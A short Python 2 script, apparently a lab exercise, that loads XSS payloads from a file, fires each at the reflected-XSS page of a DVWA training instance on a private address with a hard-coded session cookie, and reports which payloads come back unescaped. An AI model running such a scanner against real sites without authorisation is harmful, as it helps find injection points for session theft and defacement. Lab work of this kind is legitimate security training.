import requests
dosya=open("xss_payload.txt","r")
xss_payloads=dosya.read()
dosya.close()
for payload in xss_payloads.split("\n"):
	print payload
	url="http://10.10.10.20/dvwa/vulnerabilities/xss_r/?name="+payload
	header={"Content-Type":"text/html","Cookie":"security=high; PHPSESSID=9e6f6a3b34cfa7ef5688c623249ad356"}
	sonuc = requests.get(url=url,headers=header)
	if payload in sonuc.content:
		print "[+] Payload:",payload
	else:
		print "[-] Payload:",payload
